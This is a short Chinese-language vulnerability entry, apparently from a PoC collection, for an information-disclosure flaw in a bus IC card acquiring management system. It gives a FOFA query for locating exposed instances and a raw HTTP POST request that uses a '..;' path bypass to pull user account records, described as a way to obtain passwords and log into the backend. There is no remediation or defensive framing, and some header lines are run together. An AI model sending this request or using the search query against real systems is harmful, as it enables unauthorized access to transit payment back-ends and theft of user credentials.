# 公交IC卡收单管理系统信息泄露漏洞

公交IC卡收单管理系统信息泄露漏洞，通过泄露的账户密码 登录后台系统。

## fofa

```javascript
app="公交IC卡收单管理系统"
```

## poc



```javascript
POST /assets/..;/user HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=B4B300824AA8F075EAC1E702454B91B
AIf-None-Match: W/"8977-1726725363928"If-Modified-Since: Thu, 19 Sep 2024 05:56:03 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 197

_search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
```

![e00dcd3eb6fcdbc24bef62d405657e5a](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181606738.jpg)